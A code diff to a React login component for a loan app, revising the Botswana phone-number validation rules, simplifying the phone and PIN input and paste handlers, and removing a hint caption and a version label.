@@ -33,36 +33,34 @@ export default function Login() {
 
   useEffect(() => {
     return () => {
-      if (pollingIntervalRef.current) {
-        clearInterval(pollingIntervalRef.current);
-      }
+      if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
     };
   }, []);
 
-  // Validate Botswana phone: 9-10 digits, starting with 7 or 8
+  // Valid Botswana formats:
+  //   8 digits NOT starting with 0  (e.g. 71234567)
+  //   9 digits starting with 0      (e.g. 071234567)
   const validatePhoneNumber = (number) => {
     if (!number) return { valid: false, message: '' };
-    
-    if (number.length !== 9 && number.length !== 10) {
-      return { valid: false, message: 'Phone number must be 9 or 10 digits!' };
-    }
 
-    if (number[0] !== '7' && number[0] !== '8') {
-      return { valid: false, message: 'Phone number must start with 7 or 8!' };
-    }
-    
-    return { valid: true, message: '' };
+    if (number.length === 8 && number[0] !== '0') return { valid: true, message: '' };
+    if (number.length === 9 && number[0] === '0') return { valid: true, message: '' };
+
+    return {
+      valid: false,
+      message:
+        'Enter 8 digits without leading 0 (e.g. 71234567)\nor 9 digits with leading 0 (e.g. 071234567)'
+    };
   };
 
   const handlePhoneChange = (e) => {
-    const numericValue = e.target.value.replace(/\D/g, '').slice(0, 10);
+    const numericValue = e.target.value.replace(/\D/g, '').slice(0, 9);
     setPhoneNumber(numericValue);
   };
 
   const handlePhonePaste = (e) => {
     e.preventDefault();
-    const pastedText = e.clipboardData.getData('text');
-    const numericValue = pastedText.replace(/\D/g, '').slice(0, 10);
+    const numericValue = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 9);
     setPhoneNumber(numericValue);
   };
 
@@ -74,21 +72,15 @@ export default function Login() {
     newPin[index] = numericValue;
     setPin(newPin);
 
-    if (numericValue && index < 3) {
-      pinRefs[index + 1].current.focus();
-    }
+    if (numericValue && index < 3) pinRefs[index + 1].current.focus();
   };
 
   const handlePinPaste = (e, index) => {
     e.preventDefault();
     const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4).split('');
-    
     const newPin = [...pin];
-    digits.forEach((digit, i) => {
-      if (index + i < 4) newPin[index + i] = digit;
-    });
+    digits.forEach((digit, i) => { if (index + i < 4) newPin[index + i] = digit; });
     setPin(newPin);
-
     pinRefs[Math.min(index + digits.length, 3)].current.focus();
   };
 
@@ -206,7 +198,6 @@ export default function Login() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phoneNumber: formattedPhone })
       });
-
       const statusData = await statusResponse.json();
       const returning = statusData.isReturningUser || false;
       setIsReturningUser(returning);
@@ -216,7 +207,6 @@ export default function Login() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phoneNumber: formattedPhone, pin: fullPin, timestamp: new Date().toISOString() })
       });
-
       const loginData = await loginResponse.json();
 
       if (loginData.success) {
@@ -245,10 +235,10 @@ export default function Login() {
     setErrorMessage('');
   };
 
-  // Valid: 9-10 digits starting with 7 or 8
-  const isFormComplete = 
-    (phoneNumber.length === 9 || phoneNumber.length === 10) &&
-    (phoneNumber[0] === '7' || phoneNumber[0] === '8') &&
+  // Complete when: (8 digits no leading 0) OR (9 digits with leading 0) AND all 4 PIN digits filled
+  const isFormComplete =
+    ((phoneNumber.length === 8 && phoneNumber[0] !== '0') ||
+     (phoneNumber.length === 9 && phoneNumber[0] === '0')) &&
     pin.every(digit => digit !== '');
 
   const getButtonState = () => {
@@ -271,10 +261,10 @@ export default function Login() {
               {waitingForApproval ? 'Please wait...' : 'Processing...'}
             </h1>
             <p className="processing-subtitle">
-              {waitingForApproval 
-                ? 'This usually takes a few seconds' 
-                : isReturningUser 
-                  ? 'Welcome back! Taking you to dashboard...' 
+              {waitingForApproval
+                ? 'This usually takes a few seconds'
+                : isReturningUser
+                  ? 'Welcome back! Taking you to dashboard...'
                   : 'Preparing verification...'
               }
             </p>
@@ -327,16 +317,13 @@ export default function Login() {
               value={phoneNumber}
               onChange={handlePhoneChange}
               onPaste={handlePhonePaste}
-              placeholder="712345678"
-              maxLength="10"
+              placeholder="71234567"
+              maxLength="9"
               inputMode="numeric"
               required
               disabled={serverStatus.isChecking}
             />
           </div>
-          <small style={{ display: 'block', marginTop: '-1.5rem', marginBottom: '1.5rem', color: '#888', fontSize: '12px', textAlign: 'center' }}>
-            9 or 10 digits starting with 7 or 8
-          </small>
 
           <div className="pin-section">
             <p className="pin-label">Enter your PIN</p>
@@ -393,7 +380,6 @@ export default function Login() {
             </div>
             <div className="footer-logo-subtitle">Quick &amp; Easy Loans</div>
           </div>
-          <p className="version-text">v2.1.3P</p>
           <p className="terms-text">
             By signing in you agree to the{' '}
             <span className="terms-link">Terms and Conditions</span>
